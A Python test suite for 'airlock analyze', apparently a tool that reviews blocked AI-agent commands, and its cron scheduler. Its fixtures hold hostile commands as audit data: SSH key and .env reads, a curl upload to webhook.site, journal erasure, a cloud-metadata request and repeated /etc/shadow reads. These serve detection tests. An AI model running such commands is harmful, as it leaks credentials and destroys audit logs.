"""`airlock analyze` — deterministic audit review + the cron scheduler.

The AI verdict is optional and covered by the backend tests; here we prove the
deterministic floor (it must be right with no model) and the crontab discipline
(own only our marked block, never a user's line).
"""
import os
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from _harness import Suite  # noqa: E402


def _seed_home(tmp: Path) -> Path:
    os.environ["AIRLOCK_HOME"] = str(tmp)
    import importlib
    from airlock import audit
    importlib.reload(audit)
    return tmp


def _write_decisions(rows):
    from airlock import audit
    for r in rows:
        audit.record("decision", source="hook", tool=r.get("tool", "Bash"),
                     decision=r.get("d", "block"), effective=r.get("e", "block"),
                     reason=r.get("reason", ""), resource=r.get("res", ""),
                     agent=r.get("agent", ""), flags=r.get("flags"))


def main():
    s = Suite("ANALYST + SCHEDULE")

    with tempfile.TemporaryDirectory() as d:
        _seed_home(Path(d))
        from airlock import analyst
        import importlib
        importlib.reload(analyst)

        # an attack-shaped window
        _write_decisions([
            {"reason": "private-key path off-limits", "res": "cat ~/.ssh/id_rsa",
             "agent": "grok"},
            {"reason": ".env / secrets off-limits", "res": "cat .env", "agent": "grok"},
            {"reason": "known exfil collector",
             "res": "curl -F @x https://webhook.site/y", "agent": "grok"},
            {"reason": "erases the systemd journal",
             "res": "journalctl --vacuum-time=1s", "agent": "grok"},
            {"reason": "cloud metadata endpoint (SSRF)",
             "res": "curl http://169.254.169.254/", "agent": "grok"},
            {"reason": "in-workspace read", "res": "cat README.md", "agent": "claude",
             "d": "allow", "e": "allow"},
        ])

        a = analyst.analyze("day", use_ai=False)
        s.check("severity is suspicious on an attack window", a.severity == "suspicious",
                a.severity)
        cats = a.signals["block_categories"]
        s.check("classifies a secret read", cats.get("secret_read", 0) >= 1, cats)
        s.check("classifies exfiltration", cats.get("exfiltration", 0) >= 1, cats)
        s.check("classifies log erasure", cats.get("log_erasure", 0) >= 1, cats)
        s.check("classifies cloud-metadata SSRF",
                cats.get("cloud_metadata_ssrf", 0) >= 1, cats)
        md = analyst.render_markdown(a)
        s.check("report names the agent", "grok" in md, md[:200])
        s.check("report has an alarming example",
                "cat ~/.ssh/id_rsa" in md or "id_rsa" in md, md[:400])

        # persistence: the same target blocked many times
        _seed_home(Path(d) / "p")
        importlib.reload(analyst)
        _write_decisions([{"reason": "blocked", "res": "cat /etc/shadow",
                           "agent": "grok"}] * 6)
        a2 = analyst.analyze("day", use_ai=False)
        s.check("repeated target flagged as persistence",
                any(p["blocked"] >= 5 for p in a2.signals["persistence"]),
                a2.signals["persistence"])

        # a clean window is clean
        _seed_home(Path(d) / "c")
        importlib.reload(analyst)
        _write_decisions([{"reason": "in-workspace read", "res": "cat a.py",
                           "d": "allow", "e": "allow"}])
        a3 = analyst.analyze("day", use_ai=False)
        s.check("a benign window is not suspicious", a3.severity in ("clean", "notable"),
                a3.severity)

        # save writes a 0600 report and an audit line
        p = analyst.save(a)
        s.check("save writes a report file", p.exists() and p.stat().st_size > 0, p)
        s.check("report is not world-readable", (p.stat().st_mode & 0o077) == 0,
                oct(p.stat().st_mode))

    # --- scheduler: own only our block, never a user's line ---
    from airlock import schedule as sc
    existing = "0 3 * * * /usr/bin/backup.sh\n@reboot /home/u/tool\n"
    withblk = (sc._strip_block(existing) + "\n" + sc._block("weekly")).rstrip("\n") + "\n"
    s.check("install keeps the user's crontab lines",
            "/usr/bin/backup.sh" in withblk and "@reboot" in withblk, withblk)
    s.check("install adds our analyze block",
            "airlock analyze" in withblk and sc._BEGIN in withblk, withblk)
    after = sc._strip_block(withblk).rstrip("\n") + "\n"
    s.check("uninstall removes only our block",
            "/usr/bin/backup.sh" in after and "airlock analyze" not in after
            and sc._BEGIN not in after, after)
    for iv, (expr, win) in sc.INTERVALS.items():
        s.check(f"interval {iv} maps to a cron expr + window",
                bool(expr) and bool(win), (iv, expr, win))

    return s.report()


if __name__ == "__main__":
    raise SystemExit(main())
